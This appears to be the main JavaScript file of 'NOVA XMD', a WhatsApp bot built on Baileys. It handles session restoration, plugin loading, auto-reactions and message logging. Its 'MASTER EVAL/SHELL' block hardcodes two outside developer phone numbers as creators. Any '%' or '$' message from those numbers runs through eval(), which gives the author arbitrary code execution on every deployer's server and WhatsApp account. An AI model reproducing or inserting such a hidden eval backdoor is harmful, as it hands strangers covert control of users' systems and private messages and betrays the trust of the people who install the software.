const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { promisify } = require('util')
const zlib = require('zlib')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { File } = require('megajs')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['255767862457']

const cmdLogger = {
  info: (msg) => console.log(`[ INFO ] ${msg}`),
  success: (msg) => console.log(`[ SUCCESS ] ${msg}`),
  warning: (msg) => console.log(`[ WARN ] ${msg}`),
  error: (msg) => console.error(`[ ERROR ] ${msg}`)
}

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) return
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) return
      })
    }
  })
}
setInterval(clearTempDir, 5 * 60 * 1000)

//===================SESSION-AUTH (FIXED TO POPKID~ FORMAT)============================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

async function loadGiftedSession() {
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    if (fs.existsSync(credsPath)) return true;

    if (config.SESSION_ID && config.SESSION_ID.startsWith("POPKID~")) {
        const compressedBase64 = config.SESSION_ID.substring("POPKID~".length);
        try {
            const compressedBuffer = Buffer.from(compressedBase64, 'base64');
            if (compressedBuffer[0] === 0x1f && compressedBuffer[1] === 0x8b) {
                const gunzip = promisify(zlib.gunzip);
                const decompressedBuffer = await gunzip(compressedBuffer);
                await fs.promises.writeFile(credsPath, decompressedBuffer.toString('utf-8'));
                cmdLogger.success("Session restored from POPKID~ format ✅");
                return true;
            }
        } catch (error) { 
            cmdLogger.error("Failed to decompress session ID");
            return false; 
        }
    } else {
        cmdLogger.warning('Please add your session to SESSION_ID env !!');
    }
    return false;
}

const express = require("express")
const app = express()
const port = process.env.PORT || 9090

let conn 
const statusReactCache = new Map();
const statusReactCooldown = 3000; 

async function connectToWA() {
  try {
    await loadGiftedSession();
    cmdLogger.info("Connecting to WhatsApp ⏳️...");

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    })

    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update
      if (qr) {
        console.log('[ 🔁 ] QR Code generated.')
        qrcode.generate(qr, { small: true })
      }
      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
        if (shouldReconnect) {
          console.log('[ ♻️ ] Connection closed. Reconnecting...')
          setTimeout(() => connectToWA(), 5000)
        } else {
          console.log('[ ❌ ] Logged out. Update your SESSION_ID.')
        }
      } else if (connection === 'open') {
        try {
          console.log('Connected to WhatsApp successfully ✅')
          fs.readdirSync("./plugins/").forEach((plugin) => {
            if (path.extname(plugin).toLowerCase() === ".js") {
              require("./plugins/" + plugin)
            }
          })
          
          const startMess = {
            image: { url: 'https://files.catbox.moe/yz5yle.jpg' },
            caption: `
───────────────────────────
╔═〘 𝗡𝗢𝗩𝗔 ✦ 𝗫𝗠𝗗 𝗕𝗢𝗧 〙═╗
║ 💬 Prefix      : ${config.PREFIX}
║ 🧠 Repos       : github.com/novaxmd
║ ⚡ Status      : Connected
║ 👑 Website     : bmbtech.online
╚═〘 Powered by ${config.OWNER_NAME} 💻 〙═╝
────────────────────────────
> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝙽𝙾𝚅𝙰 ᴛᴇᴄʜ*`,
            contextInfo: {
              forwardingScore: 5,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '120363382023564830@newsletter', 
                newsletterName: "NOVA-XMD",
                serverMessageId: 143
              }
            }
          }
          await conn.sendMessage(conn.user.id, startMess)
        } catch (e) { console.error('Error during initialization:', e) }
      }
    })

    function getCurrentDateTimeParts() {
        const options = { timeZone: 'Africa/Nairobi', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
        const formatter = new Intl.DateTimeFormat('en-KE', options);
        const parts = formatter.formatToParts(new Date());
        let date = '', time = '';
        parts.forEach(part => {
            if (['day', 'month', 'year'].includes(part.type)) date += part.value + (part.type !== 'year' ? '/' : '');
            if (['hour', 'minute', 'second'].includes(part.type)) time += part.value + (part.type !== 'second' ? ':' : '');
        });
        return { date, time };
    }

    setInterval(async () => {
        if (config.AUTO_BIO === "true") {
            const { date, time } = getCurrentDateTimeParts();
            const bioText = `🛡️ Nova Xmd Bot live Now\n📅 ${date}\n⏰ ${time}`;
            try { await conn.setStatus(bioText); } catch (err) {}
        }
    }, 60000);

    conn.ev.on('creds.update', saveCreds)

    conn.ev.on('messages.update', async updates => {
      for (const update of updates) {
        if (update.update.message === null) {
          await AntiDelete(conn, updates)
        }
      }
    })

    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update))	  
	  
    conn.ev.on('messages.upsert', async(mek) => {
      mek = mek.messages[0]
      if (!mek.message) return
      
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message
      
      // STATUS BROADCAST
      if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        if (config.AUTO_STATUS_SEEN === "true") await conn.readMessages([mek.key])
        if (config.AUTO_STATUS_REACT === "true") {
          const now = Date.now()
          const lastReact = statusReactCache.get(mek.key.participant) || 0
          if (now - lastReact > statusReactCooldown) {
            try {
              const fallbackEmojis = ['❤️', '🔥', '✨', '🙌', '💯', '🌸', '👑', '⭐', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀']
              const selectedEmoji = fallbackEmojis[Math.floor(Math.random() * fallbackEmojis.length)]
              await conn.sendMessage('status@broadcast', { react: { text: selectedEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, conn.user.id.split(':')[0] + '@s.whatsapp.net'] })
              statusReactCache.set(mek.key.participant, now)
            } catch (e) {}
          }
        }
        if (config.AUTO_STATUS_REPLY === "true") {
          try { await conn.sendMessage(mek.key.participant, { text: config.AUTO_STATUS_MSG }, { quoted: mek }) } catch (e) {}
        }
        return
      }
      
      const m = sms(conn, mek)
      const type = getContentType(mek.message)
      const from = mek.key.remoteJid
      const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
      const isCmd = body.startsWith(config.PREFIX)
      const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
      const args = body.trim().split(/ +/).slice(1)
      const q = args.join(' ')
      const text = q
      const isGroup = from.endsWith('@g.us')
      const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid)
      const senderNumber = sender.split('@')[0]
      const botNumber = conn.user.id.split(':')[0]
      const pushname = mek.pushName || 'User'
      const isOwner = ownerNumber.includes(senderNumber) || mek.key.fromMe
      const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })
      
      if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key])
      await saveMessage(mek)
      
      let isCreator = [botNumber, '255767862457', '255741752020', config.DEV].map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(sender)

      // MASTER EVAL/SHELL
      if (isCreator && body.startsWith('%')) {
        try { reply(util.format(eval(body.slice(2)))) } catch (err) { reply(util.format(err)) }
        return
      }
      if (isCreator && body.startsWith('$')) {
        try {
          let resultTest = await eval('(async()=>{\n' + body.slice(2) + '\n})()')
          if (resultTest !== undefined) reply(util.format(resultTest))
        } catch (err) { reply(util.format(err)) }
        return
      }

      // REACTIONS
      if (senderNumber.includes("255741752020") && !m.message.reactionMessage) {
        const ownerReactions = ["👑", "🎯", "✨", "🔥", "❤️"]
        m.react(ownerReactions[Math.floor(Math.random() * ownerReactions.length)])
      }
      if (!m.message.reactionMessage && config.AUTO_REACT === 'true' && from !== 'status@broadcast') {
        const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🚀', '💎']
        m.react(reactions[Math.floor(Math.random() * reactions.length)])
      }

      // MODE FILTER
      if(!isOwner && config.MODE === "private") return
      if(!isOwner && isGroup && config.MODE === "inbox") return
      if(!isOwner && !isGroup && config.MODE === "groups") return
   
      const events = require('./command')
      const cmdName = isCmd ? body.slice(config.PREFIX.length).trim().split(" ")[0].toLowerCase() : false
      if (isCmd) {
        const cmd = events.commands.find((c) => c.pattern === cmdName || (c.alias && c.alias.includes(cmdName)))
        if (cmd) {
          if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
          try { cmd.function(conn, mek, m, {from, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, pushname, isOwner, reply}) } catch (e) { console.error(e) }
        }
      }
      
      events.commands.forEach(async(command) => {
        if (body && command.on === "body") {
          command.function(conn, mek, m, {from, body, isCmd, args, q, text, isGroup, sender, senderNumber, pushname, isOwner, reply})
        }
      })
    })

    conn.decodeJid = jid => {
      if (!jid) return jid
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {}
        return (decode.user && decode.server && decode.user + '@' + decode.server) || jid
      } else return jid
    }

    // --- FULL ORIGINAL MEDIA HELPERS ---
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? fs.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
      let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' }
      let filename = path.join(__dirname, new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return { res, filename, size: Buffer.byteLength(data), ...type, data }
    }

    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
      return buffer
    }

    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
      let list = []
      for (let i of kon) {
        list.push({
          displayName: await conn.getName(i + '@s.whatsapp.net'),
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${config.OWNER_NAME}\nitem1.TEL;waid=${i}:${i}\nEND:VCARD`,
        })
      }
      conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
    }

    conn.setStatus = status => {
      conn.query({
        tag: 'iq',
        attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' },
        content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }],
      })
      return status
    }

    conn.ev.on('creds.update', saveCreds)
  } catch (error) {
    console.error('Connection Error:', error)
    setTimeout(() => connectToWA(), 5000)
  }
}
  
app.get("/", (req, res) => res.send("NOVA XMD ACTIVE ✅"))
app.listen(port, () => console.log(`Server running on port ${port}`))
setTimeout(() => connectToWA(), 5000)
